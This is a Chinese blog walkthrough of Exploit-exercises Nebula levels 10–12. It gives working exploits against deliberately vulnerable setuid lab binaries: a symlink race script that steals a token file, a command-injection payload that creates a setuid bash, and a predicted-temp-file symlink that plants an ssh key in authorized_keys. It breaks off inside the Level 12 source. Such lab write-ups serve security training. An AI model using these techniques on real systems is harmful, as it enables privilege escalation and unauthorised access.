<!doctype html><html lang=zh-hans><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="chrome=1"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><meta name=author content="Liq3e"><script type=application/javascript>var doNotTrack=false;if(!doNotTrack){window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create','UA-166034540-1','auto');ga('send','pageview');}</script><script async src=https://www.google-analytics.com/analytics.js></script><link rel=prev href=https://blog.usec.cc/posts/security/reverse/format-string/><link rel=next href=https://blog.usec.cc/posts/security/ctf/wp-for-junior-0ctf/><link rel=canonical href=https://blog.usec.cc/posts/security/misc/exploit-exercises-nebula-2/><link rel=icon type=image/png sizes=32x32 href=/favicon.ico><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"><title>Exploit-exercises Nebula (Level10~19) | L33'</title><meta name=title content="Exploit-exercises Nebula (Level10~19) | L33'"><link rel=stylesheet href=/font/iconfont.css><link rel=stylesheet href=/css/main.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.usec.cc/"},"articleSection":"posts","name":"Exploit-exercises Nebula (Level10~19)","headline":"Exploit-exercises Nebula (Level10~19)","description":"本文是在解决Exploit-exerceses上Nebula中题目（Level10~19）时的一些思考与记录。 Level10 题目描述： The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call. 源码： #include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;unistd.h\u0026gt;#include \u0026lt;sys/types.h\u0026gt;#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;fcntl.h\u0026gt;#include \u0026lt;errno.h\u0026gt;#include \u0026lt;sys/socket.h\u0026gt;#include \u0026lt;netinet/in.h\u0026gt;#include \u0026lt;string.h\u0026gt; int main(int argc, char **argv) { char *file; char *host; if(argc \u0026lt; 3) { printf(\u0026#34;%s file host\\n\\tsends file to host if you have access to it\\n\u0026#34;, argv[0]); exit(1); } file = argv[1]; host = argv[2]; if(access(argv[1], R_OK) == 0) { int fd; int","inLanguage":"zh-Hans","author":"Liq3e","creator":"Liq3e","publisher":"Liq3e","accountablePerson":"Liq3e","copyrightHolder":"Liq3e","copyrightYear":"2017","datePublished":"2017-11-21T00:00:00+08:00","dateModified":"2017-11-21T00:00:00+08:00","url":"https://blog.usec.cc/posts/security/misc/exploit-exercises-nebula-2/","wordCount":5832,"keywords":["exploit-exercises","L33'"]}</script></head><body><div class=wrapper><nav class=navbar><div class=container><div class="navbar-header header-logo"><a href=javascript:void(0); class=theme-switch><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href=https://blog.usec.cc/>L33'</a></div><div class="menu navbar-right"><a class=menu-item href=/posts/>Posts</a>
<a class=menu-item href=/categories/>Categories</a>
<a class=menu-item href=/tags/>Tags</a>
<a class=menu-item href=/about/ title=About>About</a></div></div></nav><nav class=navbar-mobile id=nav-mobile style=display:none><div class=container><div class=navbar-header><div><a href=javascript:void(0); class=theme-switch><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href=https://blog.usec.cc/>L33'</a></div><div class=menu-toggle><span></span><span></span><span></span></div></div><div class=menu id=mobile-menu><a class=menu-item href=/posts/>Posts</a>
<a class=menu-item href=/categories/>Categories</a>
<a class=menu-item href=/tags/>Tags</a>
<a class=menu-item href=/about/ title=About>About</a></div></div></nav><main class=main><div class=container><article class=post-warp itemscope itemtype=http://schema.org/Article><header class=post-header><h1 class=post-title itemprop="name headline">Exploit-exercises Nebula (Level10~19)</h1><div class=post-meta>Written by <a itemprop=name href=https://blog.usec.cc/ rel=author>Liq3e</a> with ♥
<span class=post-time>on <time datetime=2017-11-21 itemprop=datePublished>November 21, 2017</time></span>
in
<i class="iconfont icon-folder"></i><span class=post-category><a href=https://blog.usec.cc/categories/security/>Security</a></span></div></header><div class=post-content><p>本文是在解决<a href=https://exploit-exercises.com>Exploit-exerceses</a>上<strong>Nebula</strong>中题目（Level10~19）时的一些思考与记录。</p><h2 id=level10>Level10</h2><p>题目描述：</p><blockquote><p>The setuid binary at <strong>/home/flag10/flag10</strong> binary will upload any file given, as long as it meets the requirements of the <a href=http://linux.die.net/man/2/access>access()</a> system call.</p></blockquote><p>源码：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/types.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;fcntl.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;errno.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/socket.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;netinet/in.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e></span>
<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>argv)
{
  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>file;
  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>host;

  <span style=color:#66d9ef>if</span>(argc <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>3</span>) {
      printf(<span style=color:#e6db74>&#34;%s file host</span><span style=color:#ae81ff>\n\t</span><span style=color:#e6db74>sends file to host if you have access to it</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, argv[<span style=color:#ae81ff>0</span>]);
      exit(<span style=color:#ae81ff>1</span>);
  }

  file <span style=color:#f92672>=</span> argv[<span style=color:#ae81ff>1</span>];
  host <span style=color:#f92672>=</span> argv[<span style=color:#ae81ff>2</span>];

  <span style=color:#66d9ef>if</span>(access(argv[<span style=color:#ae81ff>1</span>], R_OK) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
      <span style=color:#66d9ef>int</span> fd;
      <span style=color:#66d9ef>int</span> ffd;
      <span style=color:#66d9ef>int</span> rc;
      <span style=color:#66d9ef>struct</span> sockaddr_in sin;
      <span style=color:#66d9ef>char</span> buffer[<span style=color:#ae81ff>4096</span>];

      printf(<span style=color:#e6db74>&#34;Connecting to %s:18211 .. &#34;</span>, host); fflush(stdout);

      fd <span style=color:#f92672>=</span> socket(AF_INET, SOCK_STREAM, <span style=color:#ae81ff>0</span>);

      memset(<span style=color:#f92672>&amp;</span>sin, <span style=color:#ae81ff>0</span>, <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>struct</span> sockaddr_in));
      sin.sin_family <span style=color:#f92672>=</span> AF_INET;
      sin.sin_addr.s_addr <span style=color:#f92672>=</span> inet_addr(host);
      sin.sin_port <span style=color:#f92672>=</span> htons(<span style=color:#ae81ff>18211</span>);

      <span style=color:#66d9ef>if</span>(connect(fd, (<span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>sin, <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>struct</span> sockaddr_in)) <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>) {
          printf(<span style=color:#e6db74>&#34;Unable to connect to host %s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, host);
          exit(EXIT_FAILURE);
      }

<span style=color:#75715e>#define HITHERE &#34;.oO Oo.\n&#34;
</span><span style=color:#75715e></span>      <span style=color:#66d9ef>if</span>(write(fd, HITHERE, strlen(HITHERE)) <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>) {
          printf(<span style=color:#e6db74>&#34;Unable to write banner to host %s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, host);
          exit(EXIT_FAILURE);
      }
<span style=color:#75715e>#undef HITHERE
</span><span style=color:#75715e></span>
      printf(<span style=color:#e6db74>&#34;Connected!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>Sending file .. &#34;</span>); fflush(stdout);

      ffd <span style=color:#f92672>=</span> open(file, O_RDONLY);
      <span style=color:#66d9ef>if</span>(ffd <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>) {
          printf(<span style=color:#e6db74>&#34;Damn. Unable to open file</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
          exit(EXIT_FAILURE);
      }

      rc <span style=color:#f92672>=</span> read(ffd, buffer, <span style=color:#66d9ef>sizeof</span>(buffer));
      <span style=color:#66d9ef>if</span>(rc <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>) {
          printf(<span style=color:#e6db74>&#34;Unable to read from file: %s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, strerror(errno));
          exit(EXIT_FAILURE);
      }

      write(fd, buffer, rc);

      printf(<span style=color:#e6db74>&#34;wrote file!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);

  } <span style=color:#66d9ef>else</span> {
      printf(<span style=color:#e6db74>&#34;You don&#39;t have access to %s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, file);
  }
}
</code></pre></div><p>可以看到，整个程序的逻辑是首先利用<code>access()</code>函数确定用户是否对文件具有读权限，如果是的话则建立TCP连接、打开读取文件传输。</p><p>这其中的trick在于<strong><code>access()</code>函数检查的是进程的<code>real user</code>对于一个文件的权限，而<code>open()</code>函数操作文件的权限则是取决于<code>effective use</code>的权限</strong>。而这两个操作是分开的，所以这就造成了<a href=https://en.wikipedia.org/wiki/Time_of_check_to_time_of_use>TOCTOU(time of check to time of use)</a>漏洞，这是一个<strong>race condition</strong>类型的漏洞利用。</p><p>我们可以创建一个链接文件，使得在<code>access()</code>检查的时候它链接到level10用户有读权限的文件，而在open时，使得它链接到token文件。</p><p>编写shell脚本（/tmp/flag10.sh）：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=color:#75715e>#!/bin/bash
</span><span style=color:#75715e></span>
ln -fs /tmp/flag10.sh /tmp/flag10.ln
/home/flag10/flag10 /tmp/flag10.ln 127.0.0.1 &amp;

<span style=color:#66d9ef>for</span> <span style=color:#f92672>((</span>i <span style=color:#f92672>=</span> 0; i &lt; 300; i++<span style=color:#f92672>))</span>; <span style=color:#66d9ef>do</span>
	echo $i &gt; /dev/null
<span style=color:#66d9ef>done</span>

ln -fs /home/flag10/token /tmp/flag10.ln
</code></pre></div><p>其中<code>&</code>符合是为了后台运行，就可以非阻塞的执行下一条语句；插入一个for循环是为了延后链接文件的目标文件更改时间，使得它能够在<code>access()</code>检查完成后并在<code>open()</code>执行前执行（当然这是不确定能100%成功的，可以调节循环次数）。</p><p>随后我们可以在另外一个终端里监听18211端口：</p><pre><code>nc -lk 18211
</code></pre><p>可以收到token文件内容：</p><pre><code>.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
</code></pre><h2 id=level11>Level11</h2><p>题目源码：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/types.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;fcntl.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/mman.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e></span>
<span style=color:#75715e>/*
</span><span style=color:#75715e> * Return a random, non predictable file, and return the file descriptor for it.
</span><span style=color:#75715e> */</span>

<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>getrand</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>path)
{
  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>tmp;
  <span style=color:#66d9ef>int</span> pid;
  <span style=color:#66d9ef>int</span> fd;

  srandom(time(NULL));

  tmp <span style=color:#f92672>=</span> getenv(<span style=color:#e6db74>&#34;TEMP&#34;</span>);
  pid <span style=color:#f92672>=</span> getpid();
  
  asprintf(path, <span style=color:#e6db74>&#34;%s/%d.%c%c%c%c%c%c&#34;</span>, tmp, pid,
      <span style=color:#e6db74>&#39;A&#39;</span> <span style=color:#f92672>+</span> (random() <span style=color:#f92672>%</span> <span style=color:#ae81ff>26</span>), <span style=color:#e6db74>&#39;0&#39;</span> <span style=color:#f92672>+</span> (random() <span style=color:#f92672>%</span> <span style=color:#ae81ff>10</span>),
      <span style=color:#e6db74>&#39;a&#39;</span> <span style=color:#f92672>+</span> (random() <span style=color:#f92672>%</span> <span style=color:#ae81ff>26</span>), <span style=color:#e6db74>&#39;A&#39;</span> <span style=color:#f92672>+</span> (random() <span style=color:#f92672>%</span> <span style=color:#ae81ff>26</span>),
      <span style=color:#e6db74>&#39;0&#39;</span> <span style=color:#f92672>+</span> (random() <span style=color:#f92672>%</span> <span style=color:#ae81ff>10</span>), <span style=color:#e6db74>&#39;a&#39;</span> <span style=color:#f92672>+</span> (random() <span style=color:#f92672>%</span> <span style=color:#ae81ff>26</span>));

  fd <span style=color:#f92672>=</span> open(<span style=color:#f92672>*</span>path, O_CREAT<span style=color:#f92672>|</span>O_RDWR, <span style=color:#ae81ff>0600</span>);
  unlink(<span style=color:#f92672>*</span>path);
  <span style=color:#66d9ef>return</span> fd;
}

<span style=color:#66d9ef>void</span> <span style=color:#a6e22e>process</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>buffer, <span style=color:#66d9ef>int</span> length)
{
  <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> key;
  <span style=color:#66d9ef>int</span> i;

  key <span style=color:#f92672>=</span> length <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xff</span>;

  <span style=color:#66d9ef>for</span>(i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> length; i<span style=color:#f92672>++</span>) {
      buffer[i] <span style=color:#f92672>^=</span> key;
      key <span style=color:#f92672>-=</span> buffer[i];
  }

  system(buffer);
}

<span style=color:#75715e>#define CL &#34;Content-Length: &#34;
</span><span style=color:#75715e></span>
<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>argv)
{
  <span style=color:#66d9ef>char</span> line[<span style=color:#ae81ff>256</span>];
  <span style=color:#66d9ef>char</span> buf[<span style=color:#ae81ff>1024</span>];
  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>mem;
  <span style=color:#66d9ef>int</span> length;
  <span style=color:#66d9ef>int</span> fd;
  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>path;

  <span style=color:#66d9ef>if</span>(fgets(line, <span style=color:#66d9ef>sizeof</span>(line), stdin) <span style=color:#f92672>==</span> NULL) {
      errx(<span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;reading from stdin&#34;</span>);
  }

  <span style=color:#66d9ef>if</span>(strncmp(line, CL, strlen(CL)) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>) {
      errx(<span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;invalid header&#34;</span>);
  }

  length <span style=color:#f92672>=</span> atoi(line <span style=color:#f92672>+</span> strlen(CL));
  
  <span style=color:#66d9ef>if</span>(length <span style=color:#f92672>&lt;</span> <span style=color:#66d9ef>sizeof</span>(buf)) {
      <span style=color:#66d9ef>if</span>(fread(buf, length, <span style=color:#ae81ff>1</span>, stdin) <span style=color:#f92672>!=</span> length) {
          err(<span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;fread length&#34;</span>);
      }
      process(buf, length);
  } <span style=color:#66d9ef>else</span> {
      <span style=color:#66d9ef>int</span> blue <span style=color:#f92672>=</span> length;
      <span style=color:#66d9ef>int</span> pink;

      fd <span style=color:#f92672>=</span> getrand(<span style=color:#f92672>&amp;</span>path);

      <span style=color:#66d9ef>while</span>(blue <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span>) {
          printf(<span style=color:#e6db74>&#34;blue = %d, length = %d, &#34;</span>, blue, length);

          pink <span style=color:#f92672>=</span> fread(buf, <span style=color:#ae81ff>1</span>, <span style=color:#66d9ef>sizeof</span>(buf), stdin);
          printf(<span style=color:#e6db74>&#34;pink = %d</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, pink);

          <span style=color:#66d9ef>if</span>(pink <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>0</span>) {
              err(<span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;fread fail(blue = %d, length = %d)&#34;</span>, blue, length);
          }
          write(fd, buf, pink);

          blue <span style=color:#f92672>-=</span> pink;
      }    

      mem <span style=color:#f92672>=</span> mmap(NULL, length, PROT_READ<span style=color:#f92672>|</span>PROT_WRITE, MAP_PRIVATE, fd, <span style=color:#ae81ff>0</span>);
      <span style=color:#66d9ef>if</span>(mem <span style=color:#f92672>==</span> MAP_FAILED) {
          err(<span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;mmap&#34;</span>);
      }
      process(mem, length);
  }

}
</code></pre></div><p><code>process()</code>函数内前面的异或反向处理非常简单，不再表述。最开始将目光聚焦于下面一段代码：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>if</span>(fread(buf, length, <span style=color:#ae81ff>1</span>, stdin) <span style=color:#f92672>!=</span> length) {
	err(<span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;fread length&#34;</span>);
}
process(buf, length);
</code></pre></div><p>但是发现<code>fread()</code>的第二、三个参数的值有些别扭，在这种情况下，它的返回值只能是1或0，所以length就只能是1了。所以我们就可以执行一个字母的命令，这可以通过增加<code>$PATH</code>变量、然后链接来实现命令执行。但一个问题是只写入一个字母，连字符串结束符<code>\0</code>都不能插入，所以只能多次尝试，以期栈上的后一个字节正好是<code>0x00</code>。</p><p>上面的方法过于麻烦，所以转而看else中的代码，只是要求输入长度大于1024，那么我们就直接在命令后填充无用字节就可以。实现程序：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>//code.c
</span><span style=color:#75715e></span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e></span>
<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>() {
	<span style=color:#66d9ef>char</span> str[<span style=color:#ae81ff>1025</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;cp /tmp/bash /home/flag11/;chmod +s /home/flag11/bash;&#34;</span>;
	<span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> strlen(str); i <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>1025</span>; i<span style=color:#f92672>++</span>) {		
		str[i] <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x0</span>;
	}
	<span style=color:#66d9ef>int</span> length <span style=color:#f92672>=</span> <span style=color:#ae81ff>1025</span>;
	<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> key <span style=color:#f92672>=</span> length <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xff</span>;

	<span style=color:#66d9ef>char</span> c;
	<span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> length; i<span style=color:#f92672>++</span>) {
		c <span style=color:#f92672>=</span> str[i];
		str[i] <span style=color:#f92672>^=</span> key;
		key <span style=color:#f92672>-=</span> c;
	}

	<span style=color:#75715e>//FILE *f = fopen(&#34;/tmp/flag11&#34;, &#34;wb&#34;);
</span><span style=color:#75715e></span>	fprintf(stdout, <span style=color:#e6db74>&#34;Content-Length: %d</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, length);
	<span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> length; i<span style=color:#f92672>++</span>) {
		fputc(str[i], stdout);
	}
	<span style=color:#75715e>//fclose(f);
</span><span style=color:#75715e></span>	<span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
}
</code></pre></div><p>仍然打算采用我们之前的获取shell套路，设置好<code>TEMP</code>的环境变量之后执行程序：</p><p><img src=level11_3.png alt></p><p>结果却发现提示没有权限，百思不得其解。使用IDA逆向<code>flag11</code>程序后发现，在执行<code>system()</code>函数前先将<code>effective user id</code>又设置了回去：</p><p><img src=level11_1.png alt></p><p>这与题目中给出的源码并不相同😂，本以为已到了绝路。后来通过查找<a href=https://gist.github.com/graugans/88e6f54c862faec8b3d4bf5789ef0dd9>资料</a>发现，其实题目程序中还有另外可以利用的地方：写文件。在进行写文件的时候，利用的仍然是<code>effective user id</code>，可以以flag11的权限来写文件，这也是题目中费尽心机要搞一个随机文件名的目的。</p><p>题目源码中生成随机文件名一是体现在<code>pid</code>上，但一般来说新建一个进程，它的<code>pid</code>是会比上一个进程的<code>pid</code>自增1的，所以也是可预测的，即为管道左面的程序<code>pid+1</code>；另一个是体现在随机数上，但这里用到的是伪随机，通过<code>srandom()</code>设置的种子只要相同，之后产生的随机数序列都是一致的，而这里用到的<code>time()</code>函数单位是<strong>秒</strong>，因此也是存在利用的空间的。管道左右两个连续执行的小程序，其<code>time()</code>的返回值是大概率相同的。</p><p>注意到flag11用户目录下存在<code>.ssh</code>文件夹，我们可以在此文件夹下写入我们的公钥到文件<code>authorized_keys</code>中，就可以直接ssh登录至flag11账户了。</p><p>我们可以编写一程序，创建一个和flag11程序要创建的临时文件同名的文件，将它符号链接到<code>/home/flag11/.ssh/authorized_keys</code>，然后输出内容构造为公钥文件内容即可。</p><p>代码如下：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/types.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;fcntl.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/mman.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e></span>

<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>getrand</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>path, <span style=color:#66d9ef>int</span> pid, <span style=color:#66d9ef>int</span> time)
{
  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>tmp;
  <span style=color:#66d9ef>int</span> fd <span style=color:#f92672>=</span>  <span style=color:#ae81ff>0</span>;

  srandom(time);

  tmp <span style=color:#f92672>=</span> getenv(<span style=color:#e6db74>&#34;TEMP&#34;</span>);
  asprintf(path, <span style=color:#e6db74>&#34;%s/%d.%c%c%c%c%c%c&#34;</span>, tmp, pid,
      <span style=color:#e6db74>&#39;A&#39;</span> <span style=color:#f92672>+</span> (random() <span style=color:#f92672>%</span> <span style=color:#ae81ff>26</span>), <span style=color:#e6db74>&#39;0&#39;</span> <span style=color:#f92672>+</span> (random() <span style=color:#f92672>%</span> <span style=color:#ae81ff>10</span>),
      <span style=color:#e6db74>&#39;a&#39;</span> <span style=color:#f92672>+</span> (random() <span style=color:#f92672>%</span> <span style=color:#ae81ff>26</span>), <span style=color:#e6db74>&#39;A&#39;</span> <span style=color:#f92672>+</span> (random() <span style=color:#f92672>%</span> <span style=color:#ae81ff>26</span>),
      <span style=color:#e6db74>&#39;0&#39;</span> <span style=color:#f92672>+</span> (random() <span style=color:#f92672>%</span> <span style=color:#ae81ff>10</span>), <span style=color:#e6db74>&#39;a&#39;</span> <span style=color:#f92672>+</span> (random() <span style=color:#f92672>%</span> <span style=color:#ae81ff>26</span>));


  <span style=color:#66d9ef>return</span> fd;
}


<span style=color:#75715e>#define CL &#34;Content-Length: &#34;
</span><span style=color:#75715e></span>
<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>argv)
{
  <span style=color:#66d9ef>char</span> line[<span style=color:#ae81ff>256</span>];
  <span style=color:#66d9ef>char</span> buf[<span style=color:#ae81ff>2048</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;ssh-rsa your public key here...&#34;</span>;

  <span style=color:#66d9ef>int</span> pid;
  <span style=color:#66d9ef>int</span> fd;
  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>path;

  pid <span style=color:#f92672>=</span> getpid()<span style=color:#f92672>+</span><span style=color:#ae81ff>1</span>;
  getrand(<span style=color:#f92672>&amp;</span>path, pid, time(NULL));
  symlink(<span style=color:#e6db74>&#34;/home/flag11/.ssh/authorized_keys&#34;</span>,path);

  fprintf(stdout, <span style=color:#e6db74>&#34;%s%d</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>%s&#34;</span>,CL,<span style=color:#66d9ef>sizeof</span>(buf),buf);

}
</code></pre></div><p>之后即可利用密钥登录ssh：</p><p><img src=level11_2.png alt=Level11></p><h2 id=level12>Level12</h2><p>题目源码：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-lua data-lang=lua><span style=color:#66d9ef>local</span> socket <span style=color:#f92672>=</span> require(<span style=color:#e6db74>&#34;socket&#34;</span>)
<span style=color:#66d9ef>local</span> server <span style=color:#f92672>=</span> assert(socket.bind(<span style=color:#e6db74>&#34;127.0.0.1&#34;</span>, <span style=color:#ae81ff>50001</span>))

<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>hash</span>(password)
  prog <span style=color:#f92672>=</span> io.popen(<span style=color:#e6db74>&#34;echo &#34;</span><span style=color:#f92672>..</span>password<span style=color:#f92672>..</span><span style=color:#e6db74>&#34; | sha1sum&#34;</span>, <span style=color:#e6db74>&#34;r&#34;</span>)
  data <span style=color:#f92672>=</span> prog:read(<span style=color:#e6db74>&#34;*all&#34;</span>)
  prog:close()

  data <span style=color:#f92672>=</span> string.sub(data, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>40</span>)

  <span style=color:#66d9ef>return</span> data
<span style=color:#66d9ef>end</span>


<span style=color:#66d9ef>while</span> <span style=color:#ae81ff>1</span> <span style=color:#66d9ef>do</span>
  <span style=color:#66d9ef>local</span> client <span style=color:#f92672>=</span> server:accept()
  client:send(<span style=color:#e6db74>&#34;Password: &#34;</span>)
  client:settimeout(<span style=color:#ae81ff>60</span>)
  <span style=color:#66d9ef>local</span> line, err <span style=color:#f92672>=</span> client:receive()
  <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> err <span style=color:#66d9ef>then</span>
      print(<span style=color:#e6db74>&#34;trying &#34;</span> <span style=color:#f92672>..</span> line) <span style=color:#75715e>-- log from where ;\</span>
      <span style=color:#66d9ef>local</span> h <span style=color:#f92672>=</span> hash(line)

      <span style=color:#66d9ef>if</span> h <span style=color:#f92672>~=</span> <span style=color:#e6db74>&#34;4754a4f4bd5787accd33de887b9250a0691dd198&#34;</span> <span style=color:#66d9ef>then</span>
          client:send(<span style=color:#e6db74>&#34;Better luck next time</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
      <span style=color:#66d9ef>else</span>
          client:send(<span style=color:#e6db74>&#34;Congrats, your token is 413**CARRIER LOST**</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)
